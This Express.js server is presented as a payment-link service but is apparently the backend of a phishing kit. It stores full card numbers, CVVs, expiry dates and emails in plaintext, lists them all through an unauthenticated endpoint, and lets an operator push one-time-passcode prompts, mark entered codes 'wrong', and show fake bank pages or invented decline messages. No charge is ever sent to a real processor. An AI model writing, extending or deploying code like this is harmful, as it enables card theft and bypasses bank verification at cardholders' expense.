import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import { Server } from 'socket.io';

const app = express();
app.use(bodyParser.json());
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST']
}));
app.use(express.static("."));

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

const io = new Server(server);
const transactions = new Map();
const paymentLinks = new Map();

// Payment Links Endpoints
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;

    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ status: "error", message: "Invalid amount" });
    }

    if (!description?.trim()) {
      return res.status(400).json({ status: "error", message: "Description required" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;

    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString()
    });

    res.json({ status: "success", paymentLink });
  } catch (error) {
    console.error('Payment Link Error:', error);
    res.status(500).json({ status: "error", message: "Internal server error" });
  }
});

app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Not found" });
  }
  res.json({ status: "success", payment: paymentLinks.get(pid) });
});

// Transactions Endpoints
app.post('/api/sendPaymentDetails', (req, res) => {
  try {
    const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;

    if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
      return res.status(400).json({ status: "error", message: "Missing fields" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();

    const transaction = {
      id: invoiceId,
      cardNumber,
      expiry,
      cvv,
      email,
      amount: amount.toString().replace(/,/g, ''),
      currency,
      cardholder,
      status: 'processing',
      otpShown: false,
      otpEntered: null,
      otpError: false,
      redirectStatus: null,
      bankpageVisible: false,
      timestamp: new Date().toLocaleString()
    };

    transactions.set(invoiceId, transaction);
    io.emit('new_transaction');
    res.json({ status: "success", invoiceId });
  } catch (error) {
    console.error('Transaction Error:', error);
    res.status(500).json({ status: "error", message: "Payment processing failed" });
  }
});

app.get('/api/transactions', (req, res) => {
  res.json(Array.from(transactions.values()));
});

app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  io.to(invoiceId).emit('show_otp');
  res.json({ status: "success", message: "OTP form shown" });
});

app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked wrong" });
});

app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({
      status: "show_otp",
      message: "Show OTP form",
      otpError: txn.otpError
    });
  }

  if (txn.redirectStatus) {
    const redirectUrls = {
      success: `/success.html?invoiceId=${invoiceId}`,
      fail: `/fail.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
      bankpage: `/bankpage.html?invoiceId=${invoiceId}`
    };
    return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
  }

  res.json({ status: txn.status, otpError: txn.otpError });
});

app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  res.json({ status: "success", message: "OTP received" });
});

// UPDATED: Add failure reason to redirect status
app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus, failureReason } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.redirectStatus = redirectStatus;
  if (failureReason) {
    txn.failureReason = failureReason;
  }

  const redirectUrls = {
    success: `/success.html?invoiceId=${invoiceId}`,
    fail: `/fail.html?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
  };

  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl: redirectUrls[redirectStatus] || `/bankpage.html?invoiceId=${invoiceId}`
  });
});

app.post('/api/showBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });

  txn.redirectStatus = 'bankpage';
  txn.bankpageVisible = true;
  res.json({ status: 'success' });
});

app.post('/api/hideBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });

  txn.redirectStatus = null;
  txn.bankpageVisible = false;
  io.to(invoiceId).emit('hide_bankpage', { invoiceId }); // Include invoiceId in the payload
  res.json({ status: 'success' });
});

// NEW: Add transaction data endpoints for success and fail pages
app.get('/api/getTransactionForSuccess', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  res.json({
    status: "success",
    data: {
      amount: txn.amount,
      invoiceId: txn.id,
      timestamp: txn.timestamp,
      email: txn.email
    }
  });
});

app.get('/api/getTransactionForFail', (req, res) => {
  const { invoiceId, reason } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  // Map reason codes to human-readable messages
  const reasonMessages = {
    'insufficient_balance': 'Insufficient balance in your account',
    'bank_declined': 'Transaction declined by bank',
    'card_disabled': 'Online payments are disabled on your card',
    'invalid_card': 'Invalid card number or details',
    'canceled': 'Transaction canceled by user'
  };

  res.json({
    status: "failed",
    data: {
      amount: txn.amount,
      invoiceId: txn.id,
      timestamp: txn.timestamp,
      email: txn.email,
      reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
    }
  });
});

io.on('connection', (socket) => {
  socket.on('join', (invoiceId) => {
    socket.join(invoiceId);
  });
});
